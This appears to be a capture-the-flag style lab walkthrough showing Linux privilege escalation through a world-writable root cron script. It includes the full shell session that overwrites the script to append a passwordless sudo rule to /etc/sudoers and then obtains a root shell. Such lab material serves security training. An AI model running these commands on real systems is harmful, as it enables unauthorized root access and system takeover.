# EXPLOITING MISCONFIGURED CRON JOBS

```sh
student@attackdefense:~$ whoami
student
student@attackdefense:~$ groups student
student : student
student@attackdefense:~$ crontab -l
no crontab for student
```

```sh
student@attackdefense:~$ ls -al
total 12
drwxr-xr-x 1 student student 4096 Sep 23  2018 .
drwxr-xr-x 1 root    root    4096 Sep 23  2018 ..
-rw------- 1 root    root      26 Sep 23  2018 message
student@attackdefense:~$ cat message
cat: message: Permission denied
```

```sh
student@attackdefense:~$ pwd
/home/student
student@attackdefense:~$ cd /
student@attackdefense:/$ grep -rnw /usr -e "/home/student/message"
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
```

```sh
student@attackdefense:/$ ls -al /tmp
total 12
drwxrwxrwt 1 root root 4096 Jan  4 06:04 .
drwxr-xr-x 1 root root 4096 Jan  4 05:51 ..
-rw-r--r-- 1 root root   26 Jan  4 06:04 message
student@attackdefense:/$ cat /tmp/message
Hey!! you are not root :(
```

<pre class="language-sh"><code class="lang-sh">student@attackdefense:/$ ls -al /usr/local/share/copy.sh
-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh
student@attackdefense:/$ cat /usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
<strong>student@attackdefense:/$ printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' >/usr/local/share/copy.sh
</strong></code></pre>

```sh
student@attackdefense:/$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL
student@attackdefense:/$ whoami
student
student@attackdefense:/$ sudo su
root@attackdefense:/# whoami
root
```
